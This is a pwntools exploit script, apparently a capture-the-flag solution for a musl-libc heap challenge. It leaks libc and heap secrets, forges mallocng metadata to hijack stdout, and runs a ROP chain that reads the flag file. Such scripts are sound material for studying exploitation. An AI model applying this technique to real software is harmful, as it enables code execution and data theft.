from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('r')
# io = remote('123.60.25.24', 12345)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
elf = ELF('r')


def add(index, size, content):
    io.sendlineafter('>>', '1')
    io.sendlineafter('idx?\n', str(index))
    io.sendlineafter('size?\n', str(size))
    io.sendafter('Contnet?\n', content)


def delete(index):
    io.sendlineafter('>>', '2')
    io.sendlineafter('idx?\n', str(index))


def show(index):
    io.sendlineafter('>>', '3')
    io.sendlineafter('idx?\n', str(index))
    io.recvuntil('Content: ')


def pwn():
    add(0, 0xc, b'a' * 0xb)
    add(1, 0x1200, '\n')
    delete(0)
    for _ in range(13):
        add(0, 0xc, b'a' * 0xb)
        delete(0)
    add(0, 0x3c, '\n')
    delete(0)
    add(0, 0, 'a' * 0xf + '\n') 
    show(0)
    mmap_base = u64(io.recvn(0x16)[-6:].ljust(8, b'\x00')) - 0x20
    libc_base = mmap_base - 0x290000
    add(0, 0x3c, '\n')
    delete(0)
    add(0, 0x3c, '\n')
    for _ in range(12):
        add(1, 0xc, b'a' * 0xb)
        delete(1)
    payload = b'a' * 0x10 + p64(libc_base + libc.sym['__malloc_context']) + b'\x9b' + b'\n'
    add(1, 0, payload)
    show(0)
    secret = u64(io.recvn(8))
    log.success('mmap_base: ' + hex(mmap_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('secret: ' + hex(secret))
    __stdout_FILE = libc_base + libc.sym['__stdout_FILE']
    fake_meta_addr = mmap_base + 0x2010
    fake_group_addr = fake_meta_addr + 0x30

    
    sc = 8                          # 0x90
    freeable = 1
    last_idx = 0
    maplen = 1
    fake_meta  = p64(__stdout_FILE - 0x18)  # prev
    fake_meta += p64(fake_meta_addr + 0x30) # next
    fake_meta += p64(fake_group_addr)       # mem
    fake_meta += p32(0) * 2                 # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)       # meta
    fake_group += p32(1) + p32(0)           # active_idx
    padding = b'a' * 0xaa0
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + fake_group + b'\n'
    add(0, 0x3c, '\n')
    delete(0)
    add(0, 0x1200, payload)
    for _ in range(10):
        add(1, 0xc, b'a' * 0xb)
        delete(1)
    add(1, 0x3c, '\n')
    payload = b'a' * 0xc + p32(0x060600) + p64(fake_group_addr + 0x10)+ b'\n'
    add(1, 0, payload)
    delete(0)
    add(1, 0x3c, '\n')
    for _ in range(9):
        add(0, 0xc, b'a' * 0xb)
        delete(0)
    payload = b'a' * 0xc + p32(0x070700) + p64(mmap_base + 0x1560)+ b'\n'
    add(0, 0, payload)
    delete(1)

    sc = 8                          # 0x90
    last_idx = 1
    fake_meta  = p64(0)                     # prev
    fake_meta += p64(0)                     # next
    fake_meta += p64(fake_group_addr)       # mem
    fake_meta += p32(0) * 2                 # avail_mask, freed_mask
    fake_meta += p64((sc << 6) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)       # meta
    fake_group += p32(1) + p32(0)           # active_idx
    padding = b'a' * 0xa90
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + fake_group + b'\n'
    add(0, 0x1200, payload)
    for _ in range(8):
       add(1, 0xc, b'a' * 0xb)
       delete(1)
    payload = b'a' * 0xc + p32(0x080800) + p64(fake_group_addr + 0x10)+ b'\n'
    add(1, 0, payload)
    delete(0)
    add(1, 0x3c, '\n')
    for _ in range(7):
        add(0, 0xc, b'a' * 0xb)
        delete(0)
    payload = b'a' * 0xc + p32(0x090900) + p64(mmap_base + 0x1570)+ b'\n'
    add(0, 0, payload)
    delete(1)

    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    getdents = libc_base + libc.sym['getdents']
    pop_rdi_ret = libc_base + 0x14b82
    pop_rsi_ret = libc_base + 0x1b27a
    pop_rdx_ret = libc_base + 0x9328
    pop_rax_ret = libc_base + 0x1b8fd
    ret = libc_base + 0x598
    syscall = libc_base + 0x1d14
    ROPchain_addr = mmap_base + 0x2080

    '''
    ROPchain = b'/home/ctf/flag/'.ljust(0x20, b'\x00')
    ROPchain += p64(pop_rdi_ret) + p64(ROPchain_addr - 0x20) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(getdents)
    ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    '''
    ROPchain = b'/home/ctf/flag/0_l78zflag'.ljust(0x20, b'\x00')
    # open('./flag', 0, 0)
    ROPchain += p64(pop_rdi_ret) + p64(ROPchain_addr - 0x20) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    # read(3, ROPchain_addr + 0x100, 0x40)
    ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    # write(1, ROPchain_addr + 0x100, 0x40)
    ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(write)

    fake_meta  = p64(fake_meta_addr)        # prev
    fake_meta += p64(fake_meta_addr)        # next
    fake_meta += p64(__stdout_FILE - 0x10)  # mem
    fake_meta += p32(1) + p32(0)            # avail_mask, freed_mask
    fake_meta += p64((sc << 6) | last_idx)
    fake_meta += b'a' * 0x18
    fake_meta += p64(__stdout_FILE - 0x10)
    padding = b'a' * 0xa80
    payload  = padding + p64(secret) + p64(0)
    payload += fake_meta + b'\x00' * 8 + ROPchain + b'\n'
    add(0, 0x1200, payload)

    # gdb.attach(io)    
    long_jmp = libc_base + 0x4a5ae
    payload = b'a' * 0x30 + p64(__stdout_FILE + 0x50) + p64(ret) + p64(0) + p64(long_jmp)
    payload += p64(pop_rdi_ret) + p64(__stdout_FILE + 0x38) + p64(long_jmp) + p64(ROPchain_addr) + p64(ret)
    add(1, 0x80, payload + b'\n')
    # pause()
    sleep(1)
    flag = io.recv()
    log.success(str(flag))

if __name__ == '__main__':
    pwn()

